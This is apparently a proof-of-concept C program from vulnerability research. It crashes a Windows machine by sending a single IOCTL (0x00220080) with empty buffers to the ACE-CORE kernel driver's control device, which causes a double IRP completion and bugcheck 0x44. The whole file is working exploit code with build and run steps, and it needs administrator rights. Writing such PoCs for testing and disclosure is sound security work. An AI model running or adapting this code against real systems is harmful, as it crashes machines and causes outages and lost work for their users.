/*
 * ace_poc.c - minimal PoC: a single admin DeviceIoControl crashes the kernel.
 *
 * Sending IOCTL 0x00220080 (FILE_DEVICE_UNKNOWN=0x22, func 0x20, METHOD_BUFFERED,
 * access 0) with empty in/out buffers to the ACE-CORE control device causes the
 * driver to complete the IRP twice -> bugcheck 0x44 MULTIPLE_IRP_COMPLETE_REQUESTS.
 *
 * Device name (deterministic on this host; re-check with find_ace if it changes):
 *   \Device\dbedc82ad0da367ef96ef0bba77ffb162
 *
 *   cl /O2 /Fe:ace_poc.exe ace_poc.c
 *   ace_poc.exe                       (elevated)  -> BSOD
 *   ace_poc.exe \\?\GLOBALROOT\Device\<name>      (override device)
 *
 * WARNING: this WILL bugcheck the machine. Test box only.
 */
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <stdio.h>

#define ACE_CRASH_IOCTL 0x00220080u

int main(int argc, char **argv)
{
    const char *path = (argc > 1) ? argv[1]
        : "\\\\?\\GLOBALROOT\\Device\\dbedc82ad0da367ef96ef0bba77ffb162";

    HANDLE dev = CreateFileA(path, GENERIC_READ | GENERIC_WRITE,
                             FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                             NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (dev == INVALID_HANDLE_VALUE) {
        printf("open %s failed: %lu\n", path, GetLastError());
        return 1;
    }
    printf("opened %s\n", path);
    printf("sending IOCTL 0x%08x (NULL,0,NULL,0) ... if vulnerable, BSOD 0x44 now.\n",
           ACE_CRASH_IOCTL);

    DWORD bytes = 0;
    BOOL ok = DeviceIoControl(dev, ACE_CRASH_IOCTL, NULL, 0, NULL, 0, &bytes, NULL);
    /* if we get here, it did not crash */
    printf("returned ok=%d bytesRet=%lu err=%lu (no crash)\n", ok, bytes, ok ? 0 : GetLastError());
    CloseHandle(dev);
    return 0;
}
